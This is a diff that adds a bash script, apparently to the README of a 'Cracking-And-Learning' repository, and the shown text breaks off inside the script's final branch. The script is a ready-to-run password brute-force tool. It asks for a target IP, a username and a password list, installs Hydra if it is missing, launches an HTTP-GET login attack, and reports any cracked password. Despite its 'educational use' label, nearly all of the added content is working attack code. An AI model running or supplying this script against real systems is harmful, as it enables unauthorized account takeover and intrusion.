@@ -59,3 +59,38 @@ cd Cracking-And-Learning
 📁 Guides/
 📄 README.md
 📄 Getting_Started.txt
+#!/bin/bash
+# 🌐 Moka Attack Script by Nomi G — For Educational Use Only
+
+clear
+echo "======================================"
+echo "    🔥 MOKA BRUTE FORCE ATTACK 🔥     "
+echo "======================================"
+echo
+
+# User Input
+read -p "🎯 Enter Target IP: " target
+read -p "👤 Enter Username: " user
+read -p "📂 Enter Path to Password List: " passlist
+
+# Check if Hydra is installed
+if ! command -v hydra &> /dev/null; then
+    echo "❌ Hydra is not installed. Installing now..."
+    pkg install hydra -y || apt install hydra -y
+fi
+
+# Attack Begins
+echo
+echo "🚀 Starting brute force on $target with user '$user'..."
+echo
+
+hydra -l "$user" -P "$passlist" "$target" http-get | tee result.log
+
+# Check result
+if grep -q "login:" result.log; then
+    echo
+    echo "✅ Password Cracked!"
+    grep "login:" result.log
+else
+    echo
+    echo "❌ No valid password found."
